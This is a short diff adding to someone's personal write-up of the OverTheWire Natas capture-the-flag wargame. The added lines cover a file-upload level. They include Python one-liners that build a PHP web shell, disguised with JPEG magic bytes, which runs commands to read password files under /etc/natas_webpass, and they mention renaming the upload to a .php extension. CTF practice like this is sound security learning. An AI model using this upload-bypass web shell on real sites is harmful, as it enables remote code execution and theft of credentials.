@@ -468,6 +468,14 @@ https://stackoverflow.com/questions/26712824/is-it-possible-to-fix-png-files-cor
 
 
 now upload the file again, change the filename post parameter to have extention of php again and viola
+NOTE: the payload did not work so i changed it since file_get_contents() function is working from the local
+      directory and full paths or direcotry traversal is not working so ive changed it to exec() func
+
+> python -c 'with open("aha.test", "wb") as file: file.write(bytes.fromhex("FFD8FFE0") + "<?php exec(\"cat /etc/natas_webpass/natas13)\"); ?>".encode())'                                                                                                                                                       
+> xxd aha.test
+
+python -c 'with open("aha.test", "wb") as file: file.write(bytes.fromhex("FFD8FFE0") + "<?php system(\"cat /etc/natas_webpass/natas14\"); ?>".encode())'
+    
 
 
 lvl 15:
